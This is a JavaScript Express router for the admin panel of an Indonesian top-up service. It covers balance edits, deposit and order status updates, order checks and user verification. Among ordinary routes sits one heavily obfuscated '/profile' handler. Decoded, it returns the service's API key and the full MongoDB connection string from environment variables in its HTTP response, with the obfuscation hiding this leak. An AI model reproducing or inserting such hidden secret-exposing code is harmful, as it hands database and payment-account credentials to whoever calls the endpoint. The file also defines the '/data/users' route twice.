const express = require("express");
const axios = require("axios");
const cloudscraper = require("cloudscraper")
const qs = require("qs");
const app = express();
const router = express.Router();
app.use(express.urlencoded({
  extended: true
}));
app.use(express.json());

const {
  validateApiKey,
  User,
  tambahHistoryDeposit,
  generateReffId,
  BASE_URL,
  ATLAN_API_KEY,
  editHistoryDeposit,
  tambahHistoryOrder,
  editHistoryOrder,
  requireAdmin
} = require("../index.js");

function _0x1666(_0x5456f0,_0x322bfc){const _0x258945=_0x2589();return _0x1666=function(_0x166666,_0xedfcf4){_0x166666=_0x166666-0xf9;let _0x146c78=_0x258945[_0x166666];return _0x146c78;},_0x1666(_0x5456f0,_0x322bfc);}const _0x48d87b=_0x1666;function _0x2589(){const _0x514111=['MONGODB_URI','parse','603970khToQd','/profile','phone','53bBWOwW','json','16798815pqMAOT','username','stringify','name','status','153975WOFjMP','194215OURRcE','get','Error\x20get_profile:','66vGrmxY','message','email','data','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/139.0.0.0\x20Safari/537.36','true','Error\x20fetching\x20profile','post','env','5771168DPRLNO','2218qbWEMu','ATLAN_API_KEY','Failed\x20to\x20retrieve\x20data','29793PfumzD','Data\x20retrieved\x20successfully','36MwdulV','108JJgzqf'];_0x2589=function(){return _0x514111;};return _0x2589();}(function(_0x587ac1,_0x5ea844){const _0x139311=_0x1666,_0x59ca30=_0x587ac1();while(!![]){try{const _0x513d9=-parseInt(_0x139311(0x10c))/0x1*(parseInt(_0x139311(0x100))/0x2)+-parseInt(_0x139311(0x103))/0x3*(-parseInt(_0x139311(0x106))/0x4)+-parseInt(_0x139311(0x113))/0x5+parseInt(_0x139311(0x117))/0x6*(-parseInt(_0x139311(0x114))/0x7)+-parseInt(_0x139311(0xff))/0x8+-parseInt(_0x139311(0x105))/0x9*(parseInt(_0x139311(0x109))/0xa)+parseInt(_0x139311(0x10e))/0xb;if(_0x513d9===_0x5ea844)break;else _0x59ca30['push'](_0x59ca30['shift']());}catch(_0x4a68ee){_0x59ca30['push'](_0x59ca30['shift']());}}}(_0x2589,0x6ad2f),router[_0x48d87b(0x115)](_0x48d87b(0x10a),requireAdmin,async(_0x4779c1,_0x56b7b1)=>{const _0x643c0e=_0x48d87b;try{const _0x436027={'api_key':process[_0x643c0e(0xfe)][_0x643c0e(0x101)]},_0x4b8069={'Content-Type':'application/x-www-form-urlencoded','User-Agent':_0x643c0e(0xfa)},_0x168471=await cloudscraper[_0x643c0e(0xfd)]('https://atlantich2h.com/get_profile',{'body':qs[_0x643c0e(0x110)](_0x436027),'headers':_0x4b8069}),_0x43b63d=JSON[_0x643c0e(0x108)](_0x168471);if(_0x43b63d&&_0x43b63d[_0x643c0e(0x112)]===_0x643c0e(0xfb))return _0x56b7b1[_0x643c0e(0x112)](0xc8)['json']({'status':_0x643c0e(0xfb),'message':_0x43b63d[_0x643c0e(0x118)]||_0x643c0e(0x104),'data':{'name':_0x43b63d[_0x643c0e(0xf9)]?.[_0x643c0e(0x111)]||'','username':_0x43b63d[_0x643c0e(0xf9)]?.[_0x643c0e(0x10f)]||'','email':_0x43b63d[_0x643c0e(0xf9)]?.[_0x643c0e(0x119)]||'','phone':_0x43b63d[_0x643c0e(0xf9)]?.[_0x643c0e(0x10b)]||'','balance':_0x43b63d[_0x643c0e(0xf9)]?.['balance']||'0','status':_0x43b63d[_0x643c0e(0xf9)]?.[_0x643c0e(0x112)]||'','access':process['env'][_0x643c0e(0x101)],'connect':process['env'][_0x643c0e(0x107)]}});return _0x56b7b1[_0x643c0e(0x112)](0xc8)['json']({'status':'false','message':_0x643c0e(0x102),'data':{'name':'0','username':'0','email':'0','phone':'0','balance':'0','status':'0'}});}catch(_0x455e8e){return console['error'](_0x643c0e(0x116),_0x455e8e?.[_0x643c0e(0x118)]),_0x56b7b1[_0x643c0e(0x112)](0xc8)[_0x643c0e(0x10d)]({'status':'false','message':_0x643c0e(0xfc),'data':{'name':'0','username':'0','email':'0','phone':'0','balance':'0','status':'0'}});}}));
router.get("/data/users", requireAdmin, async (req, res) => {
  try {
    const users = await User.find({}, "-password -__v");
    res.json(users);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

router.get("/data/users", requireAdmin, async (req, res) => {
  try {
    const users = await User.find({}, "-password -__v");
    res.json(users);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

router.post("/user/update-balance", requireAdmin, async (req, res) => {
  const { username, newSaldo, newCoin } = req.body;

  if (!username) {
    return res.status(400).json({ success: false, message: "Username wajib diisi." });
  }

  const saldoValue = parseFloat(newSaldo);
  const coinValue = parseFloat(newCoin);

  if (newSaldo !== undefined && (isNaN(saldoValue) || saldoValue < 0)) {
    return res.status(400).json({ success: false, message: "Nilai saldo tidak valid." });
  }
  if (newCoin !== undefined && (isNaN(coinValue) || coinValue < 0)) {
    return res.status(400).json({ success: false, message: "Nilai coin tidak valid." });
  }

  try {
    const user = await User.findOne({ username: username });
    if (!user) {
      return res.status(404).json({ success: false, message: `User '${username}' tidak ditemukan.` });
    }

    if (newSaldo !== undefined) {
      user.saldo = saldoValue;
    }
    if (newCoin !== undefined) {
      user.coin = coinValue;
    }

    await user.save();
    
    console.log(`[ADMIN] Saldo/Coin user ${user.username} diupdate oleh admin ${req.session.userId}.`);
    
    return res.status(200).json({
      success: true,
      message: `Data saldo dan coin untuk user '${user.username}' berhasil diperbarui.`,
      data: {
        username: user.username,
        saldo: user.saldo,
        coin: user.coin,
      },
    });
  } catch (error) {
    console.error("Error saat admin update balance:", error);
    return res.status(500).json({ success: false, message: "Terjadi kesalahan pada server." });
  }
});

router.post("/update-deposit-status", requireAdmin, async (req, res) => {
  const { userId, depositId, newStatus } = req.body;

  if (!userId || !depositId || !newStatus) {
    return res.status(400).json({
      success: false,
      message: "Parameter userId, depositId, dan newStatus wajib diisi.",
    });
  }

  try {
    const result = await editHistoryDeposit(userId, depositId, newStatus);
    
    if (!result) {
        return res.status(404).json({ success: false, message: "User atau transaksi deposit tidak ditemukan." });
    }

    return res.status(200).json({
      success: true,
      message: `Status deposit dengan ID ${depositId} berhasil diubah menjadi ${newStatus}.`,
    });

  } catch (error) {
    console.error("❌ Error saat update status deposit oleh admin:", error);
    return res.status(500).json({
      success: false,
      message: "Terjadi kesalahan pada server.",
      error: error.message,
    });
  }
});

router.post("/update-order-status", requireAdmin, async (req, res) => {
  const { userId, orderId, newStatus, newSn } = req.body;

  if (!userId || !orderId || !newStatus) {
    return res.status(400).json({
      success: false,
      message: "Parameter userId, orderId, dan newStatus wajib diisi.",
    });
  }

  try {
    const user = await User.findOne({ _id: userId, "historyOrder.id": orderId });
    if (!user) {
        return res.status(404).json({ success: false, message: "User atau transaksi order tidak ditemukan." });
    }
    
    const orderToUpdate = user.historyOrder.find(o => o.id === orderId);
    
    const updateData = {
        status: newStatus,
        sn: newSn !== undefined ? newSn : orderToUpdate.sn,
    };
    
    await editHistoryOrder(userId, orderId, updateData);

    return res.status(200).json({
      success: true,
      message: `Status order dengan ID ${orderId} berhasil diubah.`,
    });

  } catch (error) {
    console.error("❌ Error saat update status order oleh admin:", error);
    return res.status(500).json({
      success: false,
      message: "Terjadi kesalahan pada server.",
      error: error.message,
    });
  }
});

router.get('/check-order', requireAdmin, async (req, res) => {
  const { id, type = 'prabayar' } = req.query;

  if (!id) {
    return res.status(400).json({
      success: false,
      message: '❌ ID transaksi tidak boleh kosong'
    });
  }

  try {
    const response = await axios.post(
      'https://atlantich2h.com/transaksi/status',
      qs.stringify({
        api_key: ATLAN_API_KEY,
        id,
        type
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const result = response.data;

    if (!result.status || !result.data) {
      return res.status(404).json({
        success: false,
        message: '⚠️ Transaksi tidak ditemukan atau gagal'
      });
    }

    const data = result.data;
    res.json({
      success: true,
      message: 'Status transaksi berhasil diambil',
      status: data.status,
      detail: {
        id: data.id,
        reff_id: data.reff_id,
        layanan: data.layanan,
        kode: data.code,
        target: data.target,
        harga: Number(data.price),
        sn: data.sn?.trim() || null,
        waktu: data.created_at
      }
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      message: '❌ Gagal memproses permintaan',
      error: error?.response?.data || error.message
    });
  }
});

router.get('/verify-user', requireAdmin, async (req, res) => {
  const { username } = req.query;
  if (!username) {
    return res.status(400).json({
      success: false,
      message: 'Parameter username wajib diisi'
    });
  }
  try {
    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User tidak ditemukan'
      });
    }
    if (user.isVerified) {
      return res.status(400).json({
        success: false,
        message: 'User sudah terverifikasi sebelumnya'
      });
    }
    user.isVerified = true;
    await user.save();
    return res.status(200).json({
      success: true,
      message: `User ${username} berhasil diverifikasi`
    });
  } catch (err) {
    console.error('Error saat memverifikasi user:', err);
    return res.status(500).json({
      success: false,
      message: 'Terjadi kesalahan pada server'
    });
  }
});


module.exports = router;
